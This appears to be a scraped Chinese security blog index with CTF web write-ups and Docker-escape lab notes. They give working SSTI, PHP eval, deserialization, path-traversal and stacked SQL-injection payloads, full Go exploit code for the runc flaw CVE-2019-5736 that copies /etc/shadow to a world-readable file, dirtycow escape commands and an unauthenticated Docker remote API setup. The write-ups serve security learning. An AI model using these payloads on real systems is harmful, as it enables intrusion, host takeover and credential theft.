","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x10-极客大挑战-2019knife"},{"categories":["CTF"],"content":"0x11 [护网杯 2018]easy_tornado 题目链接 tornado是一个Python编写的异步后端框架，这题既然是这个名字，那么肯定与tornado的某些特性相关。 接下来看题，网页给出了三个链接，分别是/flag.txt//welcome.txt//hints.txt。 查看flag.txt，知道了flag内容在/fllllllllllllag里。 再查看hints.txt，以及结合访问时的网址可以知道，服务端在接收到访问文件请求时，会以如下方式计算哈希校验值，与请求中的哈希值参数一致才能访问。那么问题就只剩下找出这个cookie_secret了。 image-20210304114118622image-20210304114118622 \" image-20210304114118622 注意到直接访问flag文件时，页面显示Error并且网址中的msg参数也是Error，所以这题应该是通过SSTI(服务端模板注入)攻击来获取cookie_secret。 image-20210304134904282image-20210304134904282 \" image-20210304134904282 查阅资料可知，handler.settings对象中包含有cookie_secret值。所以，直接访问error?msg={{handler.settings}}。 image-20210304135247316image-20210304135247316 \" image-20210304135247316 然后将/fllllllllllllag代入，计算 md5(cookie_secret+md5('/fllllllllllllag')) 填入到链接中访问即可 image-20210304135749480image-20210304135749480 \" image-20210304135749480 参考链接： https://blog.csdn.net/zz_Caleb/article/details/101473013 https://blog.csdn.net/zz_Caleb/article/details/96480967 https://www.tornadoweb.org/en/latest/guide/templates.html#template-syntax ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x11-护网杯-2018easy_tornado"},{"categories":["CTF"],"content":"0x12 [RoarCTF 2019]Easy Cal 题目链接 知识点： php的eval()函数，将参数作为php命令执行 空格绕过某些waf php的var_dump()/scandir()/file_get_contents()相关函数 计算器功能是通过向calc.php发起请求来实现的。 image-20210305101604030image-20210305101604030 \" image-20210305101604030 查看calc.php内容 \u003c?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); } ?\u003e 在num参数前加上一个空格，可以绕过服务端的waf，并且使得php正确解析。 使用scandir()函数查找flag文件，发现f1agg（注意这里是1）。 image-20210305111041608image-20210305111041608 \" image-20210305111041608 查看flag内容。 image-20210305110959804image-20210305110959804 \" image-20210305110959804 参考链接： BUUCTF WEB [RoarCTF 2019]Easy Calc http走私攻击 ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x12-roarctf-2019easy-cal"},{"categories":["CTF"],"content":"0x13 [极客大挑战 2019]Http ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:6:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x13-极客大挑战-2019http"},{"categories":["CTF"],"content":"0x14 [极客大挑战 2019]PHP 题目链接 知识点： php序列化serialize()与反序列化unserialize() php魔术方法（类似于钩子函数的概念），比如__wakeup()等 网站目录扫描工具与使用 CVE-2016-1724 反序列化时绕过__wakeup()方法 image-20210305162352227image-20210305162352227 \" image-20210305162352227 网页什么也没给，但是告诉你有网站备份，所以要想到网站目录扫描。 首先使用dirsearch或者hackbar或者其他工具，扫描网站，得到备份文件/www.zip（然而我实际使用并没有扫出来，不知道哪里出了问题…） 解压，可以得到以下文件 filesfiles \" files 分析index.php可知，网页获取select参数，并将其反序列化。 再查看class.php \u003c?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-\u003eusername = $username; $this-\u003epassword = $password; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if ($this-\u003epassword != 100) { echo \"\u003c/br\u003eNO!!!hacker!!!\u003c/br\u003e\"; echo \"You name is: \"; echo $this-\u003eusername;echo \"\u003c/br\u003e\"; echo \"You password is: \"; echo $this-\u003epassword;echo \"\u003c/br\u003e\"; die(); } if ($this-\u003eusername === 'admin') { global $flag; echo $flag; }else{ echo \"\u003c/br\u003ehello my friend~~\u003c/br\u003esorry i can't give you the flag!\"; die(); } } } ?\u003e 发现class.php中的类析构函数__destruct()中的一个逻辑能够显示flag。于是整体思路就比较清楚了：index.php在获取select参数之后将其反序列化，获得一个Name对象，该对象最后会被销毁。只要对象在被销毁时，其__destruct()函数执行过程中判断username和password分别为\"admin\"和100即可在页面显示flag。 接下来就是php序列化和反序列化的知识。 首先序列化一个username和password符合要求的对象，其结果为 O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} \"Nameusername\"字符串的长度为12，但是结果却显示的14。这是因为username属性为private，private类型的成员变量在序列化时，变量名中会加上类名和两个不可见字符(\\0)，因此password也同理。 所以，我们发送的请求中的select参数应为(%00表示不可见字符) O:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} 然而class.php中有一个魔术方法__wakeup()，它将username变量赋值为\"guest\"，使得无法通过之后显示flag的判断逻辑。一般情况下，它会在反序列化函数unserialize()构造完对象之后执行。 若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。 所以，需要想办法绕过__wakeup()函数。这就是CVE-2016-1724的内容。 当被反序列化的字符串中的属性个数大于对象本身的属性个数时，__wakeup()函数会被绕过不被执行。 所以，最终我们需要执行的请求参数为 O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} image-20210305162217584image-20210305162217584 \" image-20210305162217584 https://www.shuzhiduo.com/A/KE5QrVD4dL/ https://www.cnblogs.com/wangtanzhi/p/12193930.html php反序列化函数 ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:7:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x14-极客大挑战-2019php"},{"categories":["CTF"],"content":"0x00 [HCTF 2018]WarmUp 题目链接 引入眼帘的是个滑稽🤔 image-20210226211946197image-20210226211946197 \" image-20210226211946197 F12看源码，发现页面注释里提示源码在source.php。 // source.php \u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/\u003e\"; } ?\u003e 从source.php中还可以看到hint.php也包含一些信息。 $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } 查看hint.php，结果显示flag内容在ffffllllaaaagggg。直接访问该文件，发现无法访问（当然没这么简单了） image-20210226212604043image-20210226212604043 \" image-20210226212604043 再继续分析source.php，get的file参数要非空、为字符串且通过checkFile()函数判断，才能进入到include逻辑。 if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/\u003e\"; } 那就来看checkFile()函数，该函数返回true的地方一共有3处。 首先定义了一个白名单。请求的文件名在白名单中即返回true，对应于之前提到的source.php和hint.php。显然这个逻辑无法被用来读取flag。 $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } 第二个逻辑中，参数首先被根据?字符进行截取，截取后的内容如果在白名单中则返回true。这个也无法被用来读取flag。 相关函数：mb_strpos()、mb_substr() $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } 再看最后一个返回true的逻辑。发现其先将get请求中的file参数进行一次URL解码，然后再去截取?前的内容，判断是否在白名单内。同时，php在读取$_REQUEST['file']参数的时候，就会进行一次URL解码。所以，我们只需要在地址中加入?经过两次URL编码之后的内容%253f即可通过函数验证，并且使得参数在经过一次URL解码之后不含?，也就不会被当作其他get请求的参数。 $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } 所以，可以构造payload。逐级添加../，找到ffffllllaaaagggg文件路径所在。 ?file=source.php%253f/../../../../ffffllllaaaagggg image-20210226210928641image-20210226210928641 \" image-20210226210928641 最后结论：我一开始看到warmup几个大字，还以为直接F12，然后flag分为几段放在源码里…🤣🤣，pico入门题真是害人不浅啊。 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x00-hctf-2018warmup"},{"categories":["CTF"],"content":"0x01 [极客大挑战 2019]EasySQL 题目链接 简单的注入，用户名输入admin' or '1'='1' #，密码随便输即可。 image-20210227161029874image-20210227161029874 \" image-20210227161029874 但是把#换成--就不行，暂时还不知道为什么。 登录之后拿到flag image-20210227161238808image-20210227161238808 \" image-20210227161238808 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x01-极客大挑战-2019easysql"},{"categories":["CTF"],"content":"0x02 [强网杯 2019]随便注 网页提供了一个输入框，点击提交将会发出get请求，参数为inject=[输入的内容]。看源码，注释里提示“sqlmap是没有灵魂的”。 我的尝试： 提交admin' or '1'='1' #，结果页面上显示这些东西。 array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } array(2) { [0]=\u003e string(1) \"2\" [1]=\u003e string(12) \"miaomiaomiao\" } array(2) { [0]=\u003e string(6) \"114514\" [1]=\u003e string(2) \"ys\" } 显然，这应该是查询语句所作用的表的所有记录，一共有3条。 为了找到flag，使用堆叠注入，输入1';show tables;#，查询所有表名。发现存在words和1919810931114514两个表。 image1image1 \" image1 再使用desc查看两个表的结构，输入1';desc words，1';desc 1919810931114514;# 。这里有个小trick，使用纯数字表名 要在表名前后加上 ``(这里由于markdown无法转义的问题，所以没有加入到行内代码块中，实际输入要在数字前后加上)。可以看到flag内容位于1919810931114514表中。 image2image2 \" image2 image3image3 \" image3 接下来要想办法查询到该表中的flag内容。直接堆叠注入查询语句，会发现select等关键字都被过滤掉了。 image-20210227202949683image-20210227202949683 \" image-20210227202949683 于是有两种思路 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x02-强网杯-2019随便注"},{"categories":["CTF"],"content":"思路1 使用MySql的prepare功能，这是一个类似于计划任务的功能。将select查询语句转换为16进制，然后prepare…from…来执行该语句。 1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:3:1","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#思路1"},{"categories":["CTF"],"content":"思路2 直接修改表的名字，rename/alter等关键字是没有被筛选的，所以可以被输入执行。先将words表名改为其他名字，再将1919810931114514表名改为words。因为当前页面的查询对象就是表words，所以可以直接进行查询。 1';rename table `words` to `123`;rename table `1919810931114514` to `words`;alter table `words` add id int(10);# 1'or1=1# ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:3:2","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#思路2"},{"categories":["CTF"],"content":"0x03 [极客大挑战 2019]Havefun 题目链接 界面还挺好看的 image-20210227205837574image-20210227205837574 \" image-20210227205837574 源码中有这么一段注释 于是尝试get请求并且cat参数为dog，结果就出flag了…😓 image-20210227210208421image-20210227210208421 \" image-20210227210208421 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x03-极客大挑战-2019havefun"},{"categories":["CTF"],"content":"0x04 [SUCTF 2019]EasySQL 题目链接 输入1';show tables;#，没反应，输入1;show tables;#，查询到有一个Flag表。 接下来肯定就是想办法获取Flag表中的内容了。 直接输入1;select * from Flag;，发现不让你查询，那肯定是过滤了select等关键字。 接下来就是学习别人的wp了😅。 据说这题比赛的时候给了源码，查询语句为 select$_GET['query']||flagfromFlag 于是，可以输入*,1，使得被执行的查询语句为select *,1||flag from Flag，也就是select *,1 from flag。从而获取flag内容。 收获：注入的时候要先尝试带和不带'的输入，判断是数字型还是字符型注入。 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x04-suctf-2019easysql"},{"categories":["CTF"],"content":"0x05 [ACTF2020 新生赛]Include 题目链接 这题和下一题都是挺有意思的题：） 首先进入题目给出的地址，看到一个超链接tips，点击之后看到提示file=flag.php。但是我们只能看到提示文字，并不能看到flag内容。 image-20210301225314513image-20210301225314513 \" image-20210301225314513 这个时候就需要知道有个东西叫做php filter，利用php://filter伪协议，我们可以获取flag.php文件的全部内容。访问/?file=php://filter/convert.base64-encode/resource=flag.php。 image-20210301225641520image-20210301225641520 \" image-20210301225641520 将内容进行base64解码，于是得到了藏在php文件注释中的flag。 image-20210301225743179image-20210301225743179 \" image-20210301225743179 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:6:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x05-actf2020-新生赛include"},{"categories":["CTF"],"content":"0x06 [极客大挑战 2019]Secret File 题目链接 进入网页，啥也没有。检查源代码，发现了一个隐藏的链接。 image-20210301230157746image-20210301230157746 \" image-20210301230157746 image-20210301230257773image-20210301230257773 \" image-20210301230257773 访问/Archive_room.php，很明显能做的只有点击secret链接。 image-20210301230542428image-20210301230542428 \" image-20210301230542428 查看secret对应的链接，为/action.php，但是点击之后的结果却是/end.php。 image-20210301230805292image-20210301230805292 \" image-20210301230805292 于是，需要用到Burpsuite，拦截一下对action.php的访问。发现提示信息secr3t.php image-20210301223830280image-20210301223830280 \" image-20210301223830280 发现secr3t.php提供了文件包含服务，并且提示你flag在flag.php中。 image-20210301230956851image-20210301230956851 \" image-20210301230956851 了解了上一题的套路之后，应该就能想到，直接获取/secr3t.php?file=flag.php，应该是不会直接给你flag的😁。 image-20210301231222300image-20210301231222300 \" image-20210301231222300 于是，又是和上一题一样的套路，使用filter，获取flag.php内容，然后再解码。 image-20210301231417059image-20210301231417059 \" image-20210301231417059 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:7:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x06-极客大挑战-2019secret-file"},{"categories":["CTF"],"content":"0x07 [极客大挑战 2019]LoveSQL 题目链接 还是不太会… 参考wp： https://blog.csdn.net/SopRomeo/article/details/103979047 https://blog.csdn.net/xixihahawuwu/article/details/109999044?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control\u0026dist_request_id=af7328be-e424-4bcb-a3e6-e102be9d0ff9\u0026depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control 只能记录一下自己接触了啥新概念吧 测试注入类型 使用1' order by x#，测试不同x的值，根据什么时候报错来确定表的列数 union联合查询 ","date":"2021-02-26","objectID":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/:8:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录","uri":"/2021-02-26-buuctf-web%E8%AE%B0%E5%BD%95/#0x07-极客大挑战-2019lovesql"},{"categories":["实践记录"],"content":"kali上接收不到反弹shell，怎么回事(successfully got write handle {address} 这里并没有显示出来，执行到这里卡住了？) package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n cat /etc/shadow \u003e /tmp/shadow \u0026\u0026 chmod 777 /tmp/shadow\" func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) \u003e 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it's executable flag for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) \u003e 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列4 runc漏洞逃逸","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#"},{"categories":["实践记录"],"content":"原理分析： 修改容器内的/bin/sh文件，改为#!/proc/self/exe，这样的话，当容器内的/bin/sh被执行的时候，实际上被执行的文件路径是/proc/self/exe /proc/self/exe是内核为每个进程创建的符号链接，指向为该进程而执行的二进制文件。当容器中的/bin/sh被执行时，/proc/self/exe指向的宿主机上的runc就会被执行 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:1","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列4 runc漏洞逃逸","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#原理分析"},{"categories":["实践记录"],"content":"参考链接 复现参考1 复现参考2 PoC代码地址 https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/#what-is-the-vulnerability ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:1:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列4 runc漏洞逃逸","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%974-runc%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#参考链接"},{"categories":["实践记录"],"content":" Docker逃逸3：利用Linux内核漏洞 dirtycow(CVE-2016-5195) 进行逃逸 宿主机：ubuntu 14.04 Docker版本：Docker version 18.06.3-ce, build d7080c1 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:0:0","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#"},{"categories":["实践记录"],"content":"步骤1、安装虚拟机以及docker以及docker-compose ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:0","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#步骤1安装虚拟机以及docker以及docker-compose"},{"categories":["实践记录"],"content":"镜像下载： http://old-releases.ubuntu.com/releases/14.04.3/ubuntu-14.04.5-desktop-amd64.iso.torrent ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:1","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#镜像下载"},{"categories":["实践记录"],"content":"docker安装： 按照文档步骤操作到最后一步，发现docker-ce-cli找不到。经过后来的实际操作结果可知，其实安装的包只需要写到docker-ce就可以了。 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:2","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#docker安装"},{"categories":["实践记录"],"content":"docker-compose安装： https://blog.csdn.net/tianjiewang/article/details/83012635 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:3","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#docker-compose安装"},{"categories":["实践记录"],"content":"步骤2、启动dirtyCow容器并测试逃逸 首先复制仓库**dirtycow-docker-vdso** git clone https://github.com/gebl/dirtycow-docker-vdso.git 然后使用docker-compose创建容器 cd dirtycow-docker-vdso/ sudo docker-compose run dirtycow /bin/bash 查看容器ip地址，测试漏洞 ifconfig cd /dirtycow-vdso/ make ./0xdeadbeef 172.18.0.3:1234 于是在容器里就可以看到逃逸到了宿主机的环境，可以执行一系列操作 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:0","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#步骤2启动dirtycow容器并测试逃逸"},{"categories":["实践记录"],"content":"原理分析 ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:0","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#原理分析"},{"categories":["实践记录"],"content":"参考链接： https://thinkycx.me/2019-05-20-CVE-2016-5195-dirtycow-recurrence.html https://dirtycow.ninja/ https://blog.paranoidsoftware.com/dirty-cow-cve-2016-5195-docker-container-escape/ ","date":"2021-02-21","objectID":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:4:0","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列3 dirtycow漏洞利用","uri":"/2021-02-21-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%973-dirtycow%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#参考链接"},{"categories":["实践记录"],"content":"nothing ","date":"2021-02-08","objectID":"/2021-02-08-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%972-docker-socket%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD/:0:0","series":null,"tags":["Linux kernel","Docker"],"title":"Docker逃逸系列2:docker.sock危险挂载","uri":"/2021-02-08-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%972-docker-socket%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD/#"},{"categories":["实践记录"],"content":" docker逃逸第一种方式——remote api未授权访问 环境： 宿主机操作系统：Ubuntu 20.04 LTS 192.168.170.129 执行攻击的主机：Kali，5.9.0-kali1-amd64 192.168.170.128 docker版本：Docker version 20.10.2, build 2291f61 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:0:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#"},{"categories":["实践记录"],"content":"步骤1、开启docker remote api docker remote api应该是一个提供图形化界面来简化操作的功能，通过将宿主机的docker服务通过socket的方式暴露给外部连接，使得其他主机也可以访问docker服务。 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:1:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#步骤1开启docker-remote-api"},{"categories":["实践记录"],"content":"修改配置，重启服务 lzy@zyUb:~$ sudo nano /lib/systemd/system/docker.service [sudo] password for lzy: lzy@zyUb:~$ sudo systemctl daemon-reload lzy@zyUb:~$ sudo service docker restart 执行上述命令，在docker.service文件中添加以下红线所标出的内容(-H tcp://0.0.0.0:2375) 修改文件修改文件 \" 修改文件 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:1:1","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#修改配置重启服务"},{"categories":["实践记录"],"content":"查看效果 在另一台虚拟机中查看docker宿主机的2375端口，可以看到相关信息。 remote-apiremote-api \" remote-api 外部访问外部访问 \" 外部访问 